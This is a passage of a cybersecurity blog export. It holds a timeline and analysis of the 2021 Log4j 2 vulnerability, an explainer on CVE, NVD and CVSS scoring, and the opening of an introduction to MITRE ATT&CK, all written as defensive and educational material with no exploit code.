vulnerability is disclosed, Minecraft demonstrates vulnerable by sending a message in the chat windowHistoryA 0-day refers to a vulnerability that was not publicly known before. It may be zero for you and me, but being wildly exploited in secret. To put things in context, let’s start this story at the beginning.2009 (11 years earlier)Dissatisfied by Log4j version 1 and other equivalent libraries, Ralph Goers starts working on Log4j version 2 for the first time among the Apache foundation. You can read details about this in his blog post “Why was Log4j 2 created?”. It will take years for the developers to consider releasing a stable version.2013 (8 years earlier)📅2013 September 14: Log4J 2.0-beta9 is released, the first version that years later will be reported as vulnerable.2014 (7 years earlier)📅2014 July 12: Log4j 2.0 is published, first version not alpha or beta, 5 years after the project started.2015 (6 years earlier)📅2015 October 21: A related CVE‑2015‑4902 gets published with the description “Unspecified vulnerability in Oracle Java SE 6u101, 7u85, and 8u60 allows remote attackers to affect integrity via unknown vectors related to Deployment.”Many “unspecified” and “unknowns” for a description. It could be argued that not specifying the description of the vulnerability shouldn’t be allowed for a complete CVE report.Source: Alexandre Dulaunoy 2013 analysis of CVEs (GitHub repo)The same day, you can read on ITPro website news (this is a summary): Oracle has patched up a flaw in Java that allowed hackers to breach targets such as NATO and the White House in an operation known as Pawn Storm. The vulnerability was used in attacks on web assets belonging the military organisation as well as a number of prominent companies, according to Trend Micro threat analyst Jack Tang.The flaw in question (CVE‑2015‑4902) managed to evade Java’s Click-to-Play protection, which requires the user to click the space where the Java app would normally be displayed before it is executed. In effect, it asks the user if they are really sure they want to run any Java code.Bypassing click-to-play protection allows for malicious Java code to run without any alert windows being shown. To mount an attack, a hacker adds the HTML code to a malicious web site and then creates a RMI registry server which has a public IP address as well as creating another web server to hold the malicious Java code, which also has a public IP address.2016 (5 years earlier)📅2016 August 3: At BlackHat USA 2016, a presentation by Alvaro Muñoz and Oleksandr Mirosh from HP Enterprise Fortinet, shows how a combination of JNDI injection and LDAP entry poisoning could be used to make remote code execution possible, as was described in CVE‑2015‑4902 the previous year. These are the same kind of steps involved in exploiting the later discovered Log4j 2 vulnerability.2017 (4 years earlier)📅2017 January 17: Oracle updates Java to version 8u121. Adds codebase restrictions to RMI when using JNDI for remote object lookup, where classFactoryLocation field is not used for deserialization any more. But LDAP protocol still executes it, and javaFactory also is still usable to use for RCE on both RMI and LDAP, making both vulnerable to this day.📅2017 March 7: A new vulnerability is discovered, unrelated to Log4j, but on the also very popular open source framework, Apache Struts. A situation where many companies use it and have to patch it develops, similar to what has happened with Log4j 2.📅2017 March 10: Reports of hacking groups start looking for systems using Struts that are not updated with a fix.📅2017 May 12: Equifax is hit very hard by a data breach, the biggest known to that date because of a vulnerable Apache Struts. Some companies learn they can’t leave security and updating as a second thought. Others… don’t learn it.2018 (3 years earlier)📅2018 October 16: Oracle updates Java to version 8u191. When using JNDI for remote object lookup, the same classFactoryLocation restriction that was added to RMI two years ago is also added to LDAP. But javaFactory still usable on both RMI and LDAP for remote code execution to this day, being a key element for the future Log4j 2 vulnerability to succeed.2021📅2021 October 10: Jfrog reserves ID CVE‑2021‑42392 that might be for a specific issue or a block or issues. It will not be until January 6th it will be used for a vulnerability they have discovered on the H2 database (more on this later).📅2021 November 24: Chen Zhaojun of Alibaba privately reports the Log4j 2 vulnerability to the Apache team.📅2021 November 30: A pull request by Ralph Goers (original Log4j 2 creator) is opened in the Log4j GitHub repository titled “Restrict LDAP access via JNDI” to fix the issue.📅2021 December 1st: Log4j 2 exploit evidence as early as this day will later be found and tweeted about by Matthew Prince, CEO of CloudFlare. But it won’t be mass exploited until after the public disclosure.📅2021 December 5: The pull request is merged five days after Ralph Goers created it. Take into consideration that he states in his bio that “I work on Log4j and other open source projects in my spare time”.📅2021 December 6: A new version of Log4j 2 is released, 2.15.0, which includes many improvements. This update fixes the remote code execution, but 7 days later will be proven vulnerable to a possible denial of service attack. Among the changes, there is a mention to: In version 2.12.2 Log4j 2 disables access to JNDI by default. Usage of JNDI in configuration now need to be enabled explicitly. Calls to the JndiLookup will now return a constant string. Also, Log4j 2 now limits the protocols by default to only java. The message lookups feature has been completely removed.📅2021 December 8: Alibaba’s Chen reports to the Log4j 2 team again that someone had just revealed the details of the vulnerability on a Chinese blogging platform.My opinion is that maybe the author was somebody that saw the pull request. With all the caution Chen demonstrated I doubt it had something to do with him or people near him.📅2021 December 9: User tangxiaofeng7 publishes publicly in GitHub a proof of concept for exploiting the vulnerability (I saw this repository as public, but it has later been deleted or made private; some content is available on Archive.org). The vulnerability is being tweeted about (the tweet has been deleted but a copy can be seen in Archive.org). At 3:25PM the tweet has 89 retweets, 34 quotes, and 190 likes.As related information is only in Chinese, my lack of knowledge of that language, and limitations using Google Translate prevents me to investigate further.📅2021 December 10: The vulnerability in Log4j 2 for remote code execution is published as CVE‑2021‑44228, with a score of 10.0 (the maximum value).The same day reports and news start appearing continuously demonstrating very popular affected software. GrayNoise network security provider tweets about the number of hosts exploiting the vulnerability increasing from 100 to 150 in several hours. Fastly reports that in 24 hours of the report, the occurrences when scanning for the “jndi:” string that is employed in the exploit has spiked and that attackers are invested in researching different ways of exploiting the vulnerability, which is not true for all 0-day vulnerabilities that become public.Spike on queries using “jndi:” to compromise systems 24 hours after exploit published. Source: FastlyI’m certain this will create a big campaign for hacker groups, not only trying to exploit this vulnerability, but seeking similar 0-days “gems” that may have been also missing in similar circumstances. First on Log4j (but I assume this library is going to get a lot of scrutiny), then for other popular similar libraries.📅2021 December 13: A new version released of Log4j 2, v2.16.0 is released, which fixes some special cases that could result in a denial of service attack. It disables JNDI by default (fixing LOG4J2-3208) and completely removes support for Message Lookups (fixing LOG4J2-3211). As explained on their website: In version 2.16.0 Log4j disables access to JNDI by default. JNDI lookups in configuration now need to be enabled explicitly. Also, Log4j now limits the protocols by default to only java, ldap, and ldaps and limits the ldap protocols to only accessing Java primitive objects. Hosts other than the local host need to be explicitly allowed. The message lookups feature has been completely removed.📅2021 December 14: The related vulnerability CVE‑2021‑45046 is reported that is fixed in Log4j 2, v2.16.0. It is reported with a score value of just 3.2 (low), 7 days later will be increased to 9.0 (critical).The same day Log4j 1.2 is reported on CVE‑2021‑4104 with score 8.1 (high), as vulnerable to deserialization of untrusted data when the attacker has write access to the Log4j configuration. This project is at end of life, so no fix will be provided to this or other vulnerabilities that may arise.📅2021 December 16: A new vulnerability is also reported affecting Logback 1.2.7 and previous versions, a project that forked from the original Log4j 1. Described at CVE‑2021‑42550 with soce 6.6 (medium), using non-standard configuration files an untrusted deserialization of data may occur.📅2021 December 18: New release of Log4j 2.17.0 is published that “protect from infinite recursion in lookup evaluation”, the same day it’s classified as CVE‑2021‑45105.📅2021 December 22: Chinese Ministry of Information Technology (MIIT) said it will suspend collaboration for with Alibaba Cloud for not informing the Chinese government first of the Log4j vulnerability, to be reassessed in six months. The next day Alibaba Cloud would provide an official statement towards improving its risk management and compliance, arguing that it did not fully comprehend the severity of the flaw at the time.This sets a precedent for Chinese tech companies to always inform first the Chinese government of any security flaw discovered in open source, or be punished. It gives the government of that country a heads up to fix first their own systems, exploit or collaborate as they like on vulnerabilities like this one.📅2021 December 28: Another release for Log4j 2, version 2.17.1 with related CVE‑2021‑44832 with score 6.6, for a possible remote code execution (RCE) what only can happen if adversaries can modify the library’s configuration. It can be argued that this is just a misconfiguration that could be handled by benchmarks, not a vulnerability. The eagerness to find new vulnerabilities in the library is showing.2022 (next year)📅2022 January 6: Jfrog publishes information on a vulnerability for the H2 database with CVE‑2021‑42392, where an attacker may pass a JNDI driver name and URL leading to an LDAP or RMI server, causing remote code execution. The corresponding NIST NVD database entry with extended information, score, and vector is not available 2 days later.Who has been affected?Not only the software you are developing may use one of those frameworks or the Log4j 2 library directly, but also many other software products you use may do so.As the main company behind Java, many Oracle products are affected (you need to log into your Oracle account to see the full list).5 days after publishing the first vulnerability, some of the companies/products reported as affected are GitHub Enterprise Server, cPanel, SolarWinds SAM and DPA, Splunk, Tableau, several Cisco products, ArcGIS Enterprise, F-Secure products, GoAnywhere, GrayLog, Jitsi, Liferay, New Relic Java agent, Okta Radius and MFA agents, Siemens, some Sophos services, Sumo Logic, Suse OpenStack Cloud, TP-Link Omanda Controller, some Trend Micro services, Veritas Netbackup, many VMWare products. Some specific versions of Elasticsearch and Logstash are affected. Some on-premise products of Atlassian are partially affected (they use their own fork of Log4j). Minecraft Server Java edition is affected, so now is when you know that it is real.Other products like GitLab or Anaconda don’t use Log4j, and Apache Kafka uses Log4j 1, so they claim they are not affected by this (not true, more on this on part II). Jenkins isn’t affected, but plugins installed in it may be, like Jenkins Xray Connector.Saas software providers like Google Cloud, AWS and MongoDB Atlas Search also are known to have been using Log4j, and has been their responsibility to update, patch, or mitigate the problem.Azure announces that it’s not using or directly providing Log4j, but Kafka Connect for Azure Cosmos DB provided by Microsoft is affected. IBM and Salesforce seem to be still investigating the impact as December 14th, but at least IBM Sterling Order Management is affected.Users claim that Steam was vulnerable in its chat service, but I find no evidence, and no official announcement has been made. Netflix seems to have also patched the library. Apple and iCloud have been affected and changing an iPhone name has been reported as triggering the vulnerability.Insecure versions of Log4j 2 were available on Debian and Ubuntu, who have released updates.Red Hat Enterprise Linux ships with Elasticsearch that uses a compromised version, but because of the use of the Java Security Manager, access to it is limited so the problem is moderate at most.Changing an iPhone name to trigger the vulnerability on Apple’s servers. Do not use dnslog.cn por your tests! You are reporting to a third party website in China that you are vulnerable.Kudos to SwitHak for compiling an incredible list of links announcements from software vendors, from which most of this information has been compiled.Another great source of information you can use to check software and cloud provider services is this repository from the Nationaal Cyber Security Centrum, that for each item lists if it is known if has been affected or not, and if a fix is available.CVE vulnerability reports affecting Log4j 2CVE-2021-44228 NVD database: https://nvd.nist.gov/vuln/detail/CVE-2021-44228 Date: 📅2021-12-10 CVSS severity v3.1: 10.0 Critical (maximum value) Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H Summary: Log4j 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0 JNDI features do not protect against attacker-controlled LDAP and other JNDI-related endpoints that result in an easy to execute remote code execution.CVE-2021-45046 NVD database: https://nvd.nist.gov/vuln/detail/CVE-2021-45046 Date: 📅2021-12-14 CVSS severity v3.1: 9.0 Critical (was previously reported as 3.2) Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H Summary: The previous fix in Log4j 2.15.0 was incomplete and certain JNDI patterns could still be used for remote code execution.CVE-2021-45105 NVD database: https://nvd.nist.gov/vuln/detail/CVE-2021-45105 Date: 📅2021-12-18 CVSS severity v3.1: 5.9 Medium Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H Summary: The previous fix in Log4j versions 2.0-alpha1 through 2.16.0 (excluding 2.12.3 and 2.3.1) did not protect from uncontrolled recursion that can be exploited for a denial of service attack.CVE-2021-44832 NVD database: https://nvd.nist.gov/vuln/detail/CVE-2021-44832 Date: 📅12/28/2021 CVSS severity v3.1: 6.6 Medium Vector: CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H Summary: Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security fix releases 2.3.2 and 2.12.4) are vulnerable to remote code execution when a non-default configuration is used. Learn more about CVEs in my blog post “What is a CVE?”Originally for the first CVE, the list of affected software was indicating just Log4j2 from 2.0-beta9 to 2.14.1. It has been updated including many more software packages, and the list of reported affected software will keep growing.I bet it will become be the vulnerability with most software-affected references in the whole database. Also as the library is scrutinized, more previously unknown new vulnerabilities may be reported continuously. As the list of affected software in the vulnerability database keeps growing a vulnerability scan done today may not tell you all places where you are running software with a vulnerable version of Log4j 2, so you should keep monitoring continuously your security posture to make sure you are not vulnerable.CVE vulnerability reports affecting related projectsCVE-2021-42392 MITRE database: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42392 Date: 📅10/14/2021 NVD database (awaiting analysis): https://nvd.nist.gov/vuln/detail/CVE-2021-42392 Global Security Database (GSD) entry from Cloud Security Alliance, published on 8th of January. CVSS severity v3.1: 10 (from GSD) Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H/RL:O/RC:C (from GSD) Summary: On H2 database versions prior to version 2.0.206, an attacker may pass as a database parameter a JNDI driver name with a URL leading to an LDAP or RMI servers, causing remote code execution, for example through the H2 Console.CVE-2021-4104 NVD database: https://nvd.nist.gov/vuln/detail/CVE-2021-4104 Date: 📅12/14/2021 CVSS severity v3.1: 8.6 High Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H Summary: Log4j 1.2 when configured to use JMSAppender (non-default setup) is vulnerable to deserialization of untrusted data. No fix will be provided because the product is at end of life (migrate to latest Log4j 2).CVE-2021-42550 NVD database: https://nvd.nist.gov/vuln/detail/CVE-2021-42550 Date: 📅12/16/2021 CVSS severity v3.1: 6.6 Medium Vector: CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H Summary: Logback 1.2.7 and prior versions, an attacker with the required privileges to edit configurations files could craft a malicious configuration allowing to execute arbitrary code loaded from LDAP servers.Log4j 2 maintainersSource: XKCD comic 2347Log4j 2 was created by Ralph Goers. The most active people committing to the GitHub repository now are him, Gary Gregory, Remko Popma, and Matt Sicker.Just before the exploit was published, Ralph had only 7 sponsors on GitHub, on December 15 he had 78 and going up, but still, none of them are companies. The rest of the developers with sponsorship enabled had that day a combined amount of 3 sponsors.In Ralph’s words that you can read on his GitHub bio: I currently have a full time job as a Software Architect. I work on Log4j and other open source projects in my spare time and so I typically work on those issues that are of most interest to me. I have always dreamed of working on open source full time and would love your support to enable that to happen.As you can read on the Apache Log4j website: The Apache Software Foundation does not employ individuals to develop and support any of its projects. The individuals who contribute to Apache projects do it either as part of specific tasks assigned to them by their employer, on their own initiative to benefit their employer or on their own free time. While some projects at the ASF have employees who are specifically paid to work on the project, none of the committers to any of the Logging Services projects are directly paid to work on them.I think they have done an excellent job reviewing, patching, and publishing fast updates to the vulnerabilities.You can sponsor maintainers of Log4j with a one-time donation, or on a recurring monthly basis on their GitHub profile. If you can get your company to sponsor them, you will contribute to keep open source safer for you, your company, and everybody else. The maintainers that accept sponsorship are: Ralph Goers Gary Gregory Matt Sicker Volkan YazıcıThanks for the helpThank you to all referenced sources for their great job sharing information very early since the beginning of the situation.Thanks to @Quemandoacromo that after reading the article, sent me a link to Archive.org for the removed repository, and another link for the Nationaal Cyber Security Centrum list of affected software.ConclusionThe Log4j 2 vulnerabilities discovered on the 10th of December 2021 have existed since many years ago and have caused a huge snowball of insecurities affecting your project, other open and closed source software, as well as cloud services.The maintainers of that library work on it in their spare time without official support from any company but have been able to act very fast to publish fixes for the problems.Despite this, the situation right now is very uncertain, and many malicious campaigns will surely go rampant.To learn more about the technical details and a proof of concept using Kubernetes, jump to article part II: Kubernetes POC.If there is some information I missed in this article, or you just want to chat with me, let me know.And if you found this information extremely useful to you, why not let others know? Share it in a tweet, or invite me to coffee!Vicente Herrera is a software engineer working on cloud native cybersecurity (cloud, containers, Kubernetes).His latest job is cybersecurity specialist at Control Plane, and previously was Product Manager at Sysdig.He is the published author of Building Intelligent Cloud Application (O’Reilly, 2019) about using serverless and machine learning services with Azure.He has been involved in several research projects for using AI on healthcare and automatic code generation." }, { "title": "What is a CVE?", "url": "/blog/what-is-a-cve/", "categories": "Security", "tags": "CVE, CNA, MITRE, NVD, NIST, CVSS, SCAP, OpenSCAP, OVAL, security, cybersecurity, cloud-native", "date": "2021-12-06 05:20:00 +0100", "snippet": "You are playing Cyberpunk 2077, and on the introductory mission, you have to steal a car. After using an electronic tool first to open its door, you get inside, and while the hijack takes place, a message appears on the sophisticated onscreen display of the car: RUN:EXPLOIT.CVE-0322.B/055BCCAC9FEC/LOADINGThat sounds familiar, isn’t it? You are trying to figure out the numbers written there, but immediately Jackie appears for the first time, and interrupts you.You have seen it before on many occasions where a new vulnerability is discovered, and while some may have a fancy name as “SMBGhost” or “BlueKeep”, they are always accompanied by a sequence identifier like CVE-2020-0796 or CVE-2019-0708.For example, scanning the container image node:latest at the time of writing this post with an open-source vulnerability scanner like Trivy or Clair; or a commercial one like Sysdig or Aqua, you see many entries like: Library Vulnerability ID Severity Installed Fixed TITLE python3.9 CVE-2021-29921 CRITICAL 3.9.2-1   python-ipaddress: Improper input validation of octal strings curl CVE-2021-22945 CRITICAL 7.74.0-1.3   curl: use-after-free and double-free in MQTT sending ansi-regex CVE-2021-3807 HIGH 3.0.0 5.0.1, 6.0.1 nodejs-ansi-regex: Regular expression denial of service (ReDoS) matching ANSI escape codes What does CVE stand for?The Common Vulnerability and Exposures (CVE) program was launched in 1999 by MITRE. Their intent as described in their website is: The mission of the CVE Program is to identify, define, and catalog publicly disclosed cybersecurity vulnerabilities. There is one CVE Record for each vulnerability in the catalog. The vulnerabilities are discovered then assigned and published by organizations from around the world that have partnered with the CVE Program. Partners publish CVE Records to communicate consistent descriptions of vulnerabilities. Information technology and cybersecurity professionals use CVE Records to ensure they are discussing the same issue, and to coordinate their efforts to prioritize and address the vulnerabilities.At the current date, the new cve.org website holds information on 165,047 vulnerabilities; the old cve.mitre.org is still used for downloading and keyword searching. The website cvedetails.com is also nice for searching, as well as the National Vulnerability Database (NVD) (more on that later).The CVE program is sponsored by the U.S. Department of Homeland Security (DHS) Cybersecurity and Infrastructure Agency (CISA), available to the public and free to use. CVE and its logo are also registered trademarks of The MITRE Corporation.CVE IDsCVE IDs are used to univocally identify registered vulnerabilities. Organizations that assign CVE are called CVE Numbering Authorities (CNAs).A CVE ID takes the form of:CVE-&amp;lt;year&amp;gt;-&amp;lt;id number&amp;gt;That makes it easy to know if a given vulnerability is recent or very old. For example: CVE-2020-0796, aka “SMBGhost”, registered in the year 2020. CVE-2007-0029, aka “Excel Malformed String Vulnerability”, registered in the year 2007This doesn’t mean the vulnerability didn’t exist earlier, that is the year where it first was documented. By the way, that means that the CVE shown in Cyberpunk 2077 should have started with CVE-2077. Well, add that to the list of problems with that game.CVE recordA CVE ID has descriptive data associated with the vulnerability that is called CVE record. This can be in one of the following states: Reserved: The initial state for a CVE Record, can just contain an identification number (CVE ID). Published/Public: Data published for public use. Must contain CVE ID, prose description, and at least one public reference. Rejected: If the CVE ID and associated CVE Record should no longer be used, it is placed in this state, so that users can know it is invalid.For example, the CVE record for CVE-2017-5638 includes the following information: Description: The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 has incorrect exception handling and error-message generation during file-upload attempts, which allows remote attackers to execute arbitrary commands via a crafted Content-Type, Content-Disposition, or Content-Length HTTP header, as exploited in the wild in March 2017 with a Content-Type header containing a #cmd= string. State: Public Vendors, products &amp;amp; versions: Vendor: Apache Software Foundation Product: Apache Struts Versions Affected: 2.3.x before 2.3.32 2.5.x before 2.5.10.1 Reference links: (a long list of references with additional information) MITRE ATT&amp;amp;CK tactics and techniques are sometimes referenced in the description of the vulnerability, and are planned to be formaly added to CVE records soon. Learn more about them in my blog post “Introduction to MITRE ATT&amp;amp;CK”NVDThe National Institute of Standards and Technology (NIST) maintains the National Vulnerability Database (NVD) since 2005. It is built upon and fully synchronized with the CVE list, any update on CVE website appears immediately in the NVD. But it also provides enhanced information such as fix, severity score, and impact ratings. NVD also provides advanced searching features such as by OS; by vendor name, product name, and/or version number; and by vulnerability type, severity, related exploit range, and impact. The NVD is the U.S. government repository of standards based vulnerability management data represented using the Security Content Automation Protocol (SCAP). This data enables automation of vulnerability management, security measurement, and compliance. The NVD includes databases of security checklist references, security-related software flaws, misconfigurations, product names, and impact metrics.The NVD is also sponsored by CISA (as is the CVE program), and is also available to the public and free to use.An example NVD entry for a CVE id is the CVE-2020-0796 NVD entry:CVE-2020-0796 CVSS 3.X Severity and vector (more information in the following section) Base Score: 10.0 CRITICAL Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H References to Advisories, Solutions, and Tools http://packetstormsecurity.com/files/156731/CoronaBlue-SMBGhost-Microsoft-Windows-10-SMB-3.1.1-Proof-Of-Concept.html, Third Party Advisory http://packetstormsecurity.com/files/156732/Microsoft-Windows-SMB-3.1.1-Remote-Code-Execution.html, Third Party Advisory http://packetstormsecurity.com/files/156980/Microsoft-Windows-10-SMB-3.1.1-Local-Privilege-Escalation.html http://packetstormsecurity.com/files/157110/SMBv3-Compression-Buffer-Overflow.html http://packetstormsecurity.com/files/157901/Microsoft-Windows-SMBGhost-Remote-Code-Execution.html http://packetstormsecurity.com/files/158054/SMBleed-SMBGhost-Pre-Authentication-Remote-Code-Execution-Proof-Of-Concept.html https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796, Patch, Vendor Advisory Weakness Enumeration CWE-119, Improper Restriction of Operations within the Bounds of a Memory Buffer Known Affected Software Configurations cpe:2.3:o:microsoft:windows_10:1903:*:*:*:*:*:*:* cpe:2.3:o:microsoft:windows_10:1909:*:*:*:*:*:*:* cpe:2.3:o:microsoft:windows_server_2016:1903:*:*:*:*:*:*:* cpe:2.3:o:microsoft:windows_server_2016:1909:*:*:*:*:*:*:* Change History 7 change records found show changes The reference links provided can classified as Third Party Advisory, VDB Entry (Vulnerability Database Entry), Exploit, Mailing List, Mitigation, Release Notes, Patch, US Government Resource among others. Of special interest is the Exploit category that indicates that there is a known exploit for the vulnerability.CPE (Common Platform Enumeration) and SWID (Software Identification) are used to identify the software and version where a vulnerability has been found.NVD also includes references to the Common Weakness Enumeration (CWE) by MITRE when describing the vulnerability. When people talk about the information “on a CVE”, they usually mean the extended information available on the NVD.CVSSThe Common Vulnerability Scoring System (CVSS) is a way to assess the severity of vulnerabilities. Two versions of this standard are used right now, CVSS V2 and V3.1.CVSS V2 severity score ranks them as Low (0.0-3.9), Medium (4.0-6.9) or High (7.0-10.0). It also includes information about Base metrics (Access Vector, Access Complexity, Authentication) and Impact metrics (Confidentiality, Integrity, Availability) which combines in a formula for the base score, as well as Temporal metrics (Exploitability, Remediation Level, Report Confidence), Environmental metrics (Collateral Damage Potential, Target Distribution, Impact Subscore Modifier).CVSS V3.X severity score ranks vulnerabilities as None (0.0), Low (0.1-3.9), Medium (4.0-6.9), High (7.0-8.9) or Critical (9.0-10.0). It includes new metrics for User Interaction, Privileges required, and Scope; Access Complexity was renamed Attack Complexity, some metrics values were updated, and Environmental metrics were replaced by a second Base score known as Modified vector.CVSS V3.1 metrics and possible values are: Base Score Attack Vector (AV): Network (N), Adjacent (A), Local (L), Physical (P) Attack Complexity (AC): Low (L), High (H) Privileges Required (PR): None (N), Low (L), Hight (H) User Interaction (UI): None (N), Required (R) Scope (S): Unchanged (U), Changed (C) Confidentiality (C): None (N), Low (L), High (H) Integrity (I): None (N), Low (L), High (H) Availability (A): None (N), Low (L), High (H) Temporal score Exploit Code Maturity (E): Not Defined (X), Unproven (U), Proof-of-Concept (P), Functional (F), High (H) Remediation Level (RL): Not Defined (X), Official Fix (O), Temporary Fix (T), Workaround (W), Unavailable (U) Report Confidence (RC): Not Defined (X), Unknown (U), Reasonable (R), Confirmed (C) Environmental Score Confidentiality Requirement (CR): Not Defined (X), Low (L), Medium (M), High (H) Integrity Requirement (IR): Not Defined (X), Low (L), Medium (M), High (H) Availability Requirement (AR): Not Defined (X), Low (L), Medium (M), High (H) Modified Attack Vector (MAV): Not Defined (X), Network (N), Adjacent Network (A), Local (L), Physical (P) Modified Attack Complexity (MAC): Not Defined (X), Low (L), High (H) Modified Privileges Required (MPR): Not Defined (X), None, Low (L), High (H) Modified User Interaction (MUI): Not Defined (X), None (N), Required (R) Modified Scope (MS): Not Defined (X), Unchanged (U), Changed (C) Modified Confidentiality (MC): Not Defined (X), None (N), Low (L), High (H) Modified Integrity (MI): Not Defined (X), None (N), Low (L), High (H) Modified Availability (MA): Not Defined (X), None (N), Low (L), High (H) The metrics and values can be shown in a vector representation, that requires all metrics from the base score, and optionally some from the temporal or environmental score. The Severity is a combined score calculated with pre-established formula in the range from 0 to 10.For example, for CVE-2020-0796: CVSS 3.X Severity: 10.0 Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:HPretty scary that one, isn’t it?CVSS metrics is a complex topic that requires further study if you want to learn the fine details about this information, where you can find several websites that assist in its calculation.Two kinds of vulnerabilitiesOther experts (and me) say that there are only two kinds of vulnerabilities: those that you are going to fix, and those that you are not.A vulnerability scanner may show you in a container or host a plethora of found vulnerabilities on operating system or software packages. You usually should focus on: Those that have a fix available Those that have a critical or high score Those that have a known exploitIf there is a fix available, the decision is easy, go apply the fixing version. Be careful, sometimes when upgrading a component you may end up with more vulnerabilities than the one you were replacing. You may have the choice of upgrading the minor or the major version. An alternative could be to look for an equivalent piece of software or package that could replace the original one (that may be costly as it may require further modifications). In any case, integration and quality tests should be conducted prior to deploying to production to ensure the change works as expected.Vulnerabilities with critical or high scores mean that they live on an important part of that software, or that if they are compromised the level of access a malicious actor can obtain is huge. But if there is no known exploit, it may be just something programmers have found not being done well in its code, but for which there is no practical way of exploiting. Several vulnerabilities like this, with critical score, are old but have no fix because it’s practically impossible to exploit. An important additional consideration is risk: how critical is the workload you are protecting in the whole scheme of your application/infrastructure. For you, workloads exposed to the public Internet, that handle payments or sensitive private personal information, for example, should boost the priority of the vulnerabilities found there.Judging what to do in each situation is part of the security specialist’s job.SCAP and OVALThe Security Content Automation Protocol (SCAP) is a multi-purpose framework of specifications maintained by NIST that supports automated configuration, vulnerability and patch checking, technical control compliance activities, and security measurement.The Open Vulnerability and Assessment Language (OVAL) is one of the standards defined in SCAP, designed to check for the presence of vulnerabilities and configuration issues on computer systems. OVAL includes a language to encode system details and an assortment of content repositories held throughout the community. The official OVAL repository is hosted by the Center for Internet Security (CIS), but there are also other repositories like the ones provided by Debian, or Red Hat.The OpenSCAP project is a collection of open source tools for implementing and enforcing this SCAP and OVAL.For example, Red Hat’s Atomic Scan is a container vulnerability scan tool by Red Hat that forms part of OpenSCAP, and can be used to search for vulnerabilities and check compliance defined as defined by SCAP.Is this all?No, there are several more things you can learn from beyond CVE and NVD.Vulnerability scanners can use alternative sources of information in addition to the CVE/NVD, like the private, subscription-based VulnDB, or Google’s Open Source Vulnerabilities (OSV) database. Here you can find a list of other vulnerability databases from mayor vendors, some in OVAL format, as well as their own CVE trackers. Some other security vendors provide their own vulnerability databases, but usually it’s just a copy of the official NVD with better UI (just look for the CVE number on each entry).Other interesting sources of adversarial information are the Malware Attribute Enumeration and Characterization (MAEC) and the Common Attack Pattern Enumeration and Classification (CAPEC), both also by MITRE.ConclusionThe Common Vulnerability and Exposures (CVE) by MITRE is a way to centralize the identification of vulnerabilities as they are discovered by several organizations. You should check the National Vulnerability Database (NVD) as it always improves on the base CVE, with additional information like the CVSS vulnerabilities metrics and severity. When using a vulnerability scanner, focus on critical and high vulnerabilities, that have a fix or a known exploit.If there is some information I missed in this article, or you just want to chat with me, let me know.And if you found this information extremely useful to you, why not let others know? Share it in a tweet, or invite me to coffee!Vicente Herrera is a software engineer working on cloud native cybersecurity (cloud, containers, Kubernetes).His latest job is cybersecurity specialist at Control Plane, and previously was Product Manager at Sysdig.He is the published author of Building Intelligent Cloud Application (O’Reilly, 2019) about using serverless and machine learning services with Azure.He has been involved in several research projects for using AI on healthcare and automatic code generation." }, { "title": "Introduction to MITRE ATT&amp;CK", "url": "/blog/intro-mitre-attack/", "categories": "Security", "tags": "MITRE, ATT&CK, D3FEND, security, cybersecurity, cloud-native", "date": "2021-11-25 19:34:00 +0100", "snippet": "When you start working on cybersecurity, you for sure start seeing references to things like privilege escalation, lateral movement, or exfiltration continuously. As categories for security tools, rules, or types of attacks, with mentions to something called MITRE.Then you head to the MITRE ATT&amp;amp;CK website and discover a treasure of useful information. But it is a huge amount of it, and in retrospect, a gentler introduction to what it is there and how to consume it would be useful.This is my explanation to other people starting to look into the MITRE ATT&amp;amp;CK framework, The MITRE Corporation, its activities, and other interesting tools from them.What is this information useful for?The MITRE ATT&amp;amp;CK framework provides information that is useful to categorize cybersecurity tools, rules, actions, and attacks; in a way that mentioning a single tactic or technique name (or its id), can give people a lot of context of what it is about. It doesn’t employ a very long or formal description about each one, but instead, a summary accompanied by several very relevant exploitation samples and mitigation information with many references. It also provides many real-world categorized examples of well-documented threats.What MITRE ATT&amp;amp;CK is not good for is to replicate automated tests on evaluated infrastructure, or to automatically classify malware or adversarial activity. That is up to other tools, some of which are referenced later in this article.MITRE CorporationThe MITRE Corporation is a not-for-profit USA organization that, as they state, works in the public interest across federal, state, and local governments, as well as industry and academia.As you can read in their FAQ: We bring innovative ideas into existence in areasas varied as artificial intelligence, intuitive data science, quantum information science, healthinformatics, space security, policy, and economic expertise, trustworthy autonomy, cyber threatsharing, and cyber resilience.We operate FFRDCs —federally funded research and development centers. We also havean independent research program that explores new and expanded uses of technologies to solveour sponsors’ problems. Our federal sponsors include the Department of Defense, the Federal Aviation Administration, the Internal Revenue Service, the Department of Veterans Affairs, the Department of Homeland Security, the Administrative Office of the U.S. Courts, the Centers for Medicare &amp;amp; Medicaid Services, and the National Institute of Standards and Technology.They have some interesting free publications like Ten Strategies of a World-Class, Cybersecurity Operations Center, and other works unrelated to cybersecurity like AI Ethics discussion or Space Policy podcast. “MITRE” is not an acronym, has no special meaning, and their official full name is just “The MITRE Corporation”.MITRE ATT&amp;amp;CKAmong their initiatives, is the creation and update of the MITRE ATT&amp;amp;CK framework, a knowledge base of cybersecurity adversary Tactics, Techniques, and Procedures (sometimes called TTP).ATT&amp;amp;CK is very well known in the cybersecurity community as it is an invaluable resource for learning about and mapping security threats and tools.Screenshot of the MITRE ATT&amp;amp;CK enterprise matrix, with tactics and techniquesATT&amp;amp;CK includes definitions of tactics, that include several techniques and subtechniques, which in turn group related adversarial behaviors. They are represented in different nested matrices depending on the 